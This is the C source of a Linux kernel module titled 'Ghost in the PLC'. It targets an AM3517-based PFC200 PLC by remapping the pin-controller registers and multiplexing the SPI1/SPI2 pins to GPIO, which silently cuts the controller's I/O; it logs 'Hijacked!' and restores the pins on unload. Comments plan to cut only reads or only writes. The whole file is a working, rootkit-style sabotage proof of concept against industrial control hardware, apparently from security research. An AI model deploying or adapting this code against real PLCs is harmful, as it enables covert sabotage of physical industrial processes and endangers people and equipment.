/*
 * Usage: insmod drk.ko
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/io.h>

// From http://www.ti.com/lit/pdf/sprugr0
// AM3517 Technical Reference Manual
// Pad Configuration Register (p. 616) -> pin controller of PLC
// MUXMODE (p. 618)
// Reg. addresses (p. 626)

//
// Pad Configuration Registers are actually allocated inside PLC:
//
// 	root@PFC200-4106BA:~ cat /proc/iomem 
// 	[...]
// 	48002030-48002267 : pinctrl-single
// 	48002a00-48002a5b : pinctrl-single
// 	[...]
//

// Base of SPI config pins in pin controller
#define SPI_BASE 0x480021C8
// Offsets in words (4-bytes)
#define SPI1_SIMO 0 // 0x480021C8 [31:16]
#define SPI1_SOMI 1 // 0x480021CC [15:0]
#define SPI2_SIMO 4 // 0x480021D8 [15:0]
#define SPI2_SOMI 4 // 0x480021D8 [31:16]

// MUXMODE for r[15:0]
#define MUXMODE_L(r, m) do {	\
r &= ~(7);                  	\
r |= (m);                   	\
} while (0)

// MUXMODE for r[31:16]
#define MUXMODE_H(r, m) do {	\
r &= ~(7 << 16);            	\
r |= ((m) << 16);           	\
} while (0)

unsigned* spi_map;

static int __init io_remap_module_init(void) {
	printk(KERN_INFO "[RK] init\n");
	spi_map = ioremap(SPI_BASE, 4096); // GPIO base remapped
	printk(KERN_INFO "[RK] Mapped SPI Base address: %08x\n", (unsigned)spi_map);

	// Multiplex SPI pins to mode 4: GPIO.
	// TODO:
	//  - Check if PLC is actually using SPI1 or SPI2
	//  - Use only SIMO (or SOMI) to disable only write or read
	MUXMODE_H(*(spi_map + SPI1_SIMO), 4);
	MUXMODE_L(*(spi_map + SPI1_SOMI), 4);
	MUXMODE_L(*(spi_map + SPI2_SIMO), 4);
	MUXMODE_H(*(spi_map + SPI2_SOMI), 4);

	printk(KERN_INFO "[RK] Hijacked!\n");

	return 0;
}

static void __exit io_remap_module_exit(void) {
	// Back to original state
	MUXMODE_H(*(spi_map + SPI1_SIMO), 0);
	MUXMODE_L(*(spi_map + SPI1_SOMI), 0);
	MUXMODE_L(*(spi_map + SPI2_SIMO), 0);
	MUXMODE_H(*(spi_map + SPI2_SOMI), 0);

	iounmap(spi_map);
	printk(KERN_INFO "[RK] exit\n");
}

module_init(io_remap_module_init);
module_exit(io_remap_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tu4st");
MODULE_DESCRIPTION("Ghost in the PLC");
